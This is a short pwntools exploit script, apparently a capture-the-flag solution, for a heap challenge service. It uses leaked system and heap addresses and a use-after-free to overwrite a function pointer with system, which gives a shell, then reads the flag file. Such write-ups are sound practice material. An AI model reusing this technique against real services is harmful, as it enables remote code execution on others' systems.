from pwn import *
r = remote('10.113.184.121', 10057)

def register(idx):
    r.recvuntil(b'choice: ')
    r.send(b'1\00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\00')

def delete(idx):
    r.recvuntil(b'choice: ')
    r.send(b'2\00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\00')

def set_name(idx, length, name):
    r.recvuntil(b'choice: ')
    r.send(b'3\00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\00')
    r.recvuntil(b'Length: ')
    r.send(str(length).encode() + b'\00')
    r.recvuntil(b'Name: ')
    r.send(name)

def trigger_event(idx):
    r.recvuntil(b'choice: ')
    r.send(b'4\00')
    r.recvuntil(b'Index: ')
    r.send(str(idx).encode() + b'\00')

r.recvuntil(b'gift1: ')
system = int(r.recvline().strip(), 16)
print('system: ' + hex(system))
r.recvuntil(b'gift2: ')
heap = int(r.recvline().strip(), 16)
print('heap: ' + hex(heap))
shell = heap + 0x60
register(0)
register(1)
set_name(1, 0x10, b'sh\x00')
delete(0)
set_name(1, 0x18, p64(0) + p64(shell) + p64(system))
trigger_event(0)
r.recvline()
r.sendline(b'cat /home/chal/flag.txt')
print(r.recvline())
r.close()